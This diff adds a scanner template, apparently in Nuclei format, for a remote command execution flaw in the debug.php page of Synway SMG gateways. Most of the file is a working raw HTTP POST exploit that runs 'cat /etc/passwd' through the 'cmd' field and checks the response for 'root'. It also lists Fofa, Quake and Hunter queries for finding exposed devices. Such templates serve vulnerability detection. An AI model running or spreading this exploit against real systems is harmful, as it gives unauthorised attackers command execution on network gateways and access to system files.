@@ -1,0 +1,44 @@
+id: Synway_SMG_debug_RCE
+
+info:
+  name: Synway_SMG_debug_RCE
+  author: HK
+  severity: critical
+  description: 杭州三汇网关debug.php存在RCE漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="text ml10 mr20"
+    Quake-query: body="text ml10 mr20"
+    Hunter-query: body="text ml10 mr20"
+    verified: true
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /debug.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Length: 333
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="comdtype"
+
+    1
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="cmd"
+
+    cat /etc/passwd
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="run"
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - root
